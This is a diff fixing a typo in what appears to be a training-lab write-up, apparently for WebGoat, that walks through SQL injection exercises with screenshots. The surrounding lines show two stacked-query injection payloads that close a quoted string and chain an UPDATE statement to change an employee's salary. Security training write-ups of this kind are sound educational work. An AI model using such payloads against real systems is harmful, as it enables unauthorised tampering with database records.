@@ -107,7 +107,7 @@
  <img width="755" alt="w9" src="https://user-images.githubusercontent.com/102954934/215629146-1c148922-8596-4035-ba84-71f1d9a1a99d.png">
  
  `3SL99A';UPDATE Employees SET salary=100000 WHERE last_name='Smith' AND auth_tan='3SL99A';--`
- FOund another solution : asd'; UPDATE employees SET salary = '999999' where userid='37648'--
+ Found another solution : asd'; UPDATE employees SET salary = '999999' where userid='37648'--
  This one was just raising the salary so updating the table worked.
  
  <img width="733" alt="wg10" src="https://user-images.githubusercontent.com/102954934/215629431-2533240d-b552-4aa0-b036-31d4e8705c15.png">
